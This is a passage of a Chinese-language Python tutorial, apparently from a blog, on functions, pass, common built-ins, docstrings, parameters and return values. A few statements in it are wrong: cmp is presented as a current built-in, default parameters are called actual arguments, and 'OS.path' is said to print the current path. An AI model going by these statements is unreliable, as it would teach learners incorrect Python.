冬瓜炒肉</span><br><span class="line">数字3: 西瓜炒肉</span><br><span class="line">数字4: 南瓜炒肉</span><br><span class="line">数字5: 北瓜炒肉</span><br><span class="line">-----------------------</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>函数定义一定要在函数的调用之前，其原因：Python解释器在解析<code>.py</code>文件时会从文件的开头开始解析，会先遇到函数的定义，然后当遇到函数的调用时就知道它在哪，所以函数要先定义才能调用</li></ul><h2 id="pass-关键字"><a href="#pass-关键字" class="headerlink" title="pass 关键字"></a>pass 关键字</h2><p>如果一个函数，暂时不确定函数体的代码，可以用<code>pass</code>先占用位置，这样即没有语法错误，也能够让开发人员知道 这个函数功能没有实现，可以在后面进行编写</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">函数名</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>示例：要定义4个函数，实现加减乘除的功能，但还不清楚具体功能怎样写，此时就可以用<code>pass</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义了4个函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_2_nums</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">min_2_nums</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mult_2_nums</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div_2_nums</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别调用函数</span></span><br><span class="line">add_2_nums()</span><br><span class="line">min_2_nums()</span><br><span class="line">mult_2_nums()</span><br><span class="line">div_2_nums()</span><br></pre></td></tr></table></figure><p>如果想清楚了具体的函数应该怎样实现，那么把<code>pass</code>删除，补上需要的代码即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义了4个函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_2_nums</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;接下来要进行加法操作...&quot;</span>)</span><br><span class="line">    num1 = <span class="built_in">input</span>(<span class="string">&quot;请输入第1个数：&quot;</span>)</span><br><span class="line">    num2 = <span class="built_in">input</span>(<span class="string">&quot;请输入第2个数：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s+%s=%d&quot;</span> % (num1, num2, <span class="built_in">int</span>(num1) + <span class="built_in">int</span>(num2)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">min_2_nums</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;接下来要进行减法操作...&quot;</span>)</span><br><span class="line">    num1 = <span class="built_in">input</span>(<span class="string">&quot;请输入第1个数：&quot;</span>)</span><br><span class="line">    num2 = <span class="built_in">input</span>(<span class="string">&quot;请输入第2个数：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s-%s=%d&quot;</span> % (num1, num2, <span class="built_in">int</span>(num1) - <span class="built_in">int</span>(num2)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mult_2_nums</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;接下来要进行乘法操作...&quot;</span>)</span><br><span class="line">    num1 = <span class="built_in">input</span>(<span class="string">&quot;请输入第1个数：&quot;</span>)</span><br><span class="line">    num2 = <span class="built_in">input</span>(<span class="string">&quot;请输入第2个数：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s*%s=%d&quot;</span> % (num1, num2, <span class="built_in">int</span>(num1) * <span class="built_in">int</span>(num2)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div_2_nums</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;接下来要进行除法操作...&quot;</span>)</span><br><span class="line">    num1 = <span class="built_in">input</span>(<span class="string">&quot;请输入第1个数：&quot;</span>)</span><br><span class="line">    num2 = <span class="built_in">input</span>(<span class="string">&quot;请输入第2个数：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s/%s=%d&quot;</span> % (num1, num2, <span class="built_in">int</span>(num1) / <span class="built_in">int</span>(num2)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别调用函数</span></span><br><span class="line">add_2_nums()</span><br><span class="line">min_2_nums()</span><br><span class="line">mult_2_nums()</span><br><span class="line">div_2_nums()</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>Python代码规范中提到，定了多个函数，那么函数与函数之间空2行</li></ul><h2 id="定义一次执行N次"><a href="#定义一次执行N次" class="headerlink" title="定义一次执行N次"></a>定义一次执行N次</h2><p>一个函数可以进行多次调用，每次调用函数时，函数都会从头开始执行，当这个函数中的代码执行完毕后，意味着调用结束了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    num = <span class="number">100</span></span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;在test函数中num=%d&quot;</span> % num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test()</span><br><span class="line">test()</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">在test函数中num=101</span><br><span class="line">在test函数中num=101</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>第7行调用了第一次test函数，当test函数结束后num为101</li><li>第8行调用了第二次test函数，依然会从test函数的开头开始执行，所以结果依然是101</li></ul><h1 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h1><p>内置函数：Python自带的函数，尽情的用，对我们的开发有极大的帮助</p><p><strong>Python之所以越来越受到开发者的喜爱，原因之一就是：它丰富的内置函数，基本上需要的功能Python都有了</strong></p><p>常用的内置函数如下示例</p><h4 id="cmp"><a href="#cmp" class="headerlink" title="cmp:"></a><code>cmp</code>:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>cmp([<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line">-<span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cmp([<span class="number">1</span>, <span class="number">2</span>], [<span class="number">1</span>, <span class="number">1</span>])</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cmp([<span class="number">1</span>, <span class="number">2</span>], [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">-<span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cmp(&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>&#125;, &#123;<span class="string">&quot;b&quot;</span>:<span class="number">1</span>&#125;)</span><br><span class="line">-<span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cmp(&#123;<span class="string">&quot;a&quot;</span>:<span class="number">2</span>&#125;, &#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>&#125;)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cmp(&#123;<span class="string">&quot;a&quot;</span>:<span class="number">2</span>&#125;, &#123;<span class="string">&quot;a&quot;</span>:<span class="number">2</span>, <span class="string">&quot;b&quot;</span>:<span class="number">1</span>&#125;)</span><br><span class="line">-<span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>注意：cmp在比较字典数据时，先比较键，再比较值。</strong></p><h4 id="OS-path"><a href="#OS-path" class="headerlink" title="OS.path"></a><code>OS.path</code></h4><blockquote><p>打印当前的路径</p></blockquote><h4 id="len"><a href="#len" class="headerlink" title="len:"></a><code>len</code>:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="string">&quot;hello abcdef&quot;</span>)</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>((<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>, <span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;)</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><p><strong>注意：len在操作字典数据时，返回的是键值对个数。</strong></p><h4 id="max"><a href="#max" class="headerlink" title="max:"></a><code>max</code>:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">max</span>(<span class="string">&quot;hello abcdef&quot;</span>)</span><br><span class="line"><span class="string">&#x27;o&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">max</span>([<span class="number">1</span>,<span class="number">4</span>,<span class="number">522</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line"><span class="number">522</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">max</span>(&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>, <span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;)</span><br><span class="line"><span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">max</span>(&#123;<span class="string">&quot;a&quot;</span>:<span class="number">10</span>, <span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;)</span><br><span class="line"><span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">max</span>(&#123;<span class="string">&quot;c&quot;</span>:<span class="number">10</span>, <span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;)</span><br><span class="line"><span class="string">&#x27;c&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="del"><a href="#del" class="headerlink" title="del:"></a><code>del</code>:</h4><p>del有两种用法，一种是<code>del加空格</code>，另一种是<code>del()</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> a</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;a&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> a[<span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span>(a)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;a&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure><h4 id="time"><a href="#time" class="headerlink" title="time:"></a><code>time</code>:</h4><p>开发中，经常需要打印一些调试的信息，此时就又必须要输出时间，这就需要一些<code>时间函数</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time  <span class="comment"># 引入time模块</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">currentTime = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;当前时间戳为:&quot;</span>, currentTime)</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">当前时间戳为: 1598952056.126486</span><br></pre></td></tr></table></figure><h4 id="random"><a href="#random" class="headerlink" title="random:"></a><code>random</code>:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment">#输出浮点数</span></span><br><span class="line">a = random.uniform(<span class="number">1</span>, <span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a =&quot;</span>, a)</span><br><span class="line"></span><br><span class="line">b = random.randint(<span class="number">10</span>, <span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b =&quot;</span>, b)</span><br><span class="line"></span><br><span class="line">c = random.randrange(<span class="number">0</span>, <span class="number">51</span>, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br></pre></td></tr></table></figure><p>运行结果（每次结果都可能不同）:</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">a = 2.018423712655862</span><br><span class="line">b = 14</span><br><span class="line">c = 14</span><br></pre></td></tr></table></figure><p>内置函数有很多，在后面的课程中我们根据实际情况加以使用</p><p>切记：用到哪些内置函数就查询哪些内置函数，不用背，但要会查询会应用即可</p><h1 id="函数说明文档"><a href="#函数说明文档" class="headerlink" title="函数说明文档"></a>函数说明文档</h1><p>函数说明文档，顾名思义就是一个对函数说明的信息文档</p><p>格式如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">函数名</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    用3对双引号进行包裹，这里就是函数的说明文档，用来对函数的功能，使用方式等进行说明</span></span><br><span class="line"><span class="string">    以便开发人员能够快速的了解此函数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#检查函数</span></span><br><span class="line"><span class="built_in">help</span>(函数名)</span><br></pre></td></tr></table></figure><p>函数文档对于我们的意义：</p><p>Python内置了很多的函数，但这些函数具体的功能不是我们编写的，我们很难在较短的时间内读懂函数的实现代码</p><p>但是只要有了函数说明文档，我们就能快速的知道这个函数的作用，能够大大提高可读性</p><p>那怎样用函数的说明文档呢？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Help on built-<span class="keyword">in</span> function <span class="built_in">print</span> <span class="keyword">in</span> module builtins:</span><br><span class="line"><span class="comment">#关于模块内置函数打印的帮助</span></span><br><span class="line"><span class="built_in">print</span>(...)</span><br><span class="line">    <span class="built_in">print</span>(value, ..., sep=<span class="string">&#x27; &#x27;</span>, end=<span class="string">&#x27;\n&#x27;</span>, file=sys.stdout, flush=<span class="literal">False</span>)</span><br><span class="line">    </span><br><span class="line">    Prints the values to a stream, <span class="keyword">or</span> to sys.stdout by default.</span><br><span class="line">    <span class="type">Optional</span> keyword arguments:</span><br><span class="line">    file:  a file-like <span class="built_in">object</span> (stream); defaults to the current sys.stdout.</span><br><span class="line">    sep:   string inserted between values, default a space.</span><br><span class="line">    end:   string appended after the last value, default a newline.</span><br><span class="line">    flush: whether to forcibly(强制的) flush the stream.</span><br></pre></td></tr></table></figure><p>给大家的建议：</p><p>编写的代码不仅仅是自己看，还有可能是同事看、同学看、领导看等</p><p>当我们的代码中有函数，虽然函数说明文档可写可不写，但是建议大家写上，这样会更加规范</p><h1 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h1><h5 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h5><p>阅读如下代码，思考问题：下面的代码实现了2个数的加减乘除，并且把结果打印出来，运行如下代码感觉到哪些地方不太好吗？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义了4个函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_2_nums</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;接下来要进行加法操作...&quot;</span>)</span><br><span class="line">    num1 = <span class="built_in">input</span>(<span class="string">&quot;请输入第1个数：&quot;</span>)</span><br><span class="line">    num2 = <span class="built_in">input</span>(<span class="string">&quot;请输入第2个数：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s+%s=%d&quot;</span> % (num1, num2, <span class="built_in">int</span>(num1) + <span class="built_in">int</span>(num2)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">min_2_nums</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;接下来要进行减法操作...&quot;</span>)</span><br><span class="line">    num1 = <span class="built_in">input</span>(<span class="string">&quot;请输入第1个数：&quot;</span>)</span><br><span class="line">    num2 = <span class="built_in">input</span>(<span class="string">&quot;请输入第2个数：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s-%s=%d&quot;</span> % (num1, num2, <span class="built_in">int</span>(num1) - <span class="built_in">int</span>(num2)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mult_2_nums</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;接下来要进行乘法操作...&quot;</span>)</span><br><span class="line">    num1 = <span class="built_in">input</span>(<span class="string">&quot;请输入第1个数：&quot;</span>)</span><br><span class="line">    num2 = <span class="built_in">input</span>(<span class="string">&quot;请输入第2个数：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s*%s=%d&quot;</span> % (num1, num2, <span class="built_in">int</span>(num1) * <span class="built_in">int</span>(num2)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div_2_nums</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;接下来要进行除法操作...&quot;</span>)</span><br><span class="line">    num1 = <span class="built_in">input</span>(<span class="string">&quot;请输入第1个数：&quot;</span>)</span><br><span class="line">    num2 = <span class="built_in">input</span>(<span class="string">&quot;请输入第2个数：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s/%s=%d&quot;</span> % (num1, num2, <span class="built_in">int</span>(num1) / <span class="built_in">int</span>(num2)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别调用函数</span></span><br><span class="line">add_2_nums()</span><br><span class="line">min_2_nums()</span><br><span class="line">mult_2_nums()</span><br><span class="line">div_2_nums()</span><br></pre></td></tr></table></figure><p>上述的代码，虽然能够实现2个数的加减乘除，但有个较大的问题：4个函数中每次都需要重新获取这2个数字，我们如果想要计算1和2的加减乘除的结果，就需要输入4遍数字1，4遍数字2，这太麻烦了</p><p>想要解决这个问题，大体的思路应该是，在调用加减乘除这4个函数之前先获取要操作的2个数字，然后将这2个数字传递给函数让它们直接用即可而不是每个函数都重新获取</p><p>Python中如果在调用函数时，需要将数据传递给函数，这就用到了一个新的”传参数”</p><h5 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h5><p>想要实现”传参数“的功能，只要注意2点即可：</p><ul><li>定义函数时<code>()</code>中定义变量，变量的个数根据需要的个数来确定，这些变量的目的是用来存储传递过来的数据。我们把这些变量称之为<code>形参</code></li><li>调用函数时<code>()</code>中写入要传递的数据，可以是常量、表达式、变量等，这些就是要<strong>真实传递的数据</strong>。我们把这些数据称之为<code>实参</code></li></ul><p>如下示例，展示了调用一个函数将数字100、200都传递给它</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">num1, num2</span>):  <span class="comment"># 形参：调用函数时用来存储数据的变量</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;传递过来的第1个数是:%d&quot;</span> % num1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;传递过来的第2个数是:%d&quot;</span> % num2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;它们俩的和是:%d&quot;</span> % (num1 + num2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test(<span class="number">100</span>, <span class="number">200</span>)  <span class="comment"># 实参：在调用函数时传入具体的值</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">传递过来的第1个数是:100</span><br><span class="line">传递过来的第2个数是:200</span><br><span class="line">它们俩的和是:300</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">num1=<span class="number">1</span>, num2=<span class="number">2</span></span>)：<span class="comment">#这种情况num1，2就是实参</span></span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h5 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h5><p>要求：定义一个函数，有3个形参，函数体中要实现的功能为第1个形参+第2个形参-第3个形参 输出结果到终端</p><p>参考代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">num1, num2, num3</span>):</span><br><span class="line">    <span class="built_in">print</span>(num1+num2-num3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test(<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>)</span><br></pre></td></tr></table></figure><h1 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h1><h2 id="引入-1"><a href="#引入-1" class="headerlink" title="引入"></a>引入</h2><p>现实生活中的场景：</p><ul><li>我给儿子10块钱，让他给我买包烟。这个例子中，10块钱是我给儿子的，就相当于调用函数时传递到参数，让儿子买烟这个事情最终的目标是，让他把烟给带回来然后给你。此时烟就是<code>返回值</code></li></ul><p>开发中的场景：</p><ul><li>定义了一个函数，它检测到室内的温度，想一想是不是应该把这个结果给调用者，只有调用者拥有了这个返回值，才能够根据当前的温度做适当的调整</li></ul><p>综上所述：</p><ul><li>所谓“返回值”，就是函数完成一件事情后，最后给调用者的结果</li></ul><h2 id="使用流程-1"><a href="#使用流程-1" class="headerlink" title="使用流程"></a>使用流程</h2><p>想要用函数的返回结果，我们需要注意2点</p><ul><li>定义函数时，需要使用<code>return</code>将结果返回</li><li>调用函数时，需要存储这个返回值（当然了语法上来讲可以不存，但一般情况下都会存储，否则还要返回值干什么）</li></ul><p>定义函数时，使用<code>return</code></p><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_2_nums</span>(<span class="params">a, b</span>):</span><br><span class="line">    c = a + b</span><br><span class="line">    <span class="keyword">return</span> c  <span class="comment"># 此时就相当于把变量c的结果返回</span></span><br></pre></td></tr></table></figure><p>定义函数时保存返回值</p><p>在本小节刚开始的时候，说过的“买烟”的例子中，最后儿子给你烟时，你一定是从儿子手中接过来 对么，程序也是如此，如果一个函数返回了一个数据，那么想要用这个数据，那么就需要保存</p><p>保存函数的返回值示例如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_2_nums</span>(<span class="params">a, b</span>):</span><br><span class="line">    c = a + b</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数，顺便保存函数的返回值</span></span><br><span class="line">result = add_2_nums(<span class="number">200</span>, <span class="number">98</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 因为result已经保存了add_2_nums的返回值，所以接下来就可以使用了</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">298</span><br></pre></td></tr></table></figure><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ul><li><p><code>return</code>默认返回None</p></li><li><p><code>return</code>甚至可以返回一个函数，甚至是函数的引用地址：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>():</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment">#结果了函数a的地址</span></span><br><span class="line">&lt;function a at <span class="number">0x000002236BE06430</span>&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>return</code>实际上有两个作用：</p></li></ul><blockquote><ul><li>返回数据给调用方</li><li>结束函数的执行</li></ul></blockquote><p>猜猜看如下程序执行完毕后，会输出什么？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">num1, num2, num3</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;test-----1----&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">100</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;test-----2----&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(num1+num2-num3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = test(<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>)</span><br><span class="line"><span class="built_in">print</span>(ret)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">test-----1----</span><br><span class="line">100</span><br></pre></td></tr></table></figure><p>可见<code>return</code>不仅有返回一个数据给调用方的功能，还有结束整个函数的作用 换言之：只要在函数体中return后要执行的代码都不会被执行。</p><h2 id="return-返回多个值"><a href="#return-返回多个值" class="headerlink" title="return 返回多个值"></a>return 返回多个值</h2><p>想一想，如果一个函数中需要返回多个数据，我们改怎么实现呢？</p><p>示例一：错误示例</p><p>下面的代码，为了能够返回多个数据，用了多个<code>return</code>，想想看行吗？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_nums</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;---1---&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>  <span class="comment"># 函数中下面的代码不会被执行，因为return除了能够将数据返回之外，还有一个隐藏的功能：结束函数</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;---2---&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;---3---&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = create_nums()</span><br><span class="line"><span class="built_in">print</span>(ret)</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>一个函数中可以有多个<code>return</code>，但是只要有一个<code>return</code>被执行到，那么函数就会结束了，因此后面的<code>return</code>没有什么用处</li></ul><p>示例二：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_nums</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;---1---&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">ret = create_nums()  <span class="comment"># 此时ret存储了列表[1, 2, 3]</span></span><br><span class="line"><span class="built_in">print</span>(ret)</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>一个函数中只能有1个return被执行，可用通过return返回列表、元组、集合、字典等从而实现一次性返回多个数据</li></ul><p>注意点：</p><p>一个函数写多个<code>return</code>也不是没有任何用处，我们可以添加<code>if</code>等代码从而实现不同场景执行不同的<code>return</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_nums</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;---1---&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">100</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;---2---&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> num + <span class="number">1</span>  <span class="comment"># 函数中下面的代码不会被执行，因为return除了能够将数据返回之外，还有一个隐藏的功能：结束函数</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;---3---&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> num + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;---4---&quot;</span>)</span><br><span class="line"></span><br><span class="line">result1 = create_nums(<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(result1)  <span class="comment"># 打印101</span></span><br><span class="line">result2 = create_nums(<span 